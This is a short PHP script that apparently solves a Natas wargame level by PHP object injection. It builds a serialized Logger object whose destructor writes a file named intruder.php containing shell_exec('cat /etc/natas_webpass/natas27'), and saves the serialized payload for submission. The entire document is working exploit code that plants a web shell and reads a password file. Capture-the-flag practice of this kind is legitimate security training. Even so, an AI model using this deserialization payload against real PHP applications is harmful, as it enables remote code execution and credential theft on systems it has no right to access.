<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "./img/intruder.php";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
$obj = new Logger("a");
$text = serialize($obj);
$fd=fopen("serialized", "a+");
fwrite($fd, $text);
fclose($fd);
?>
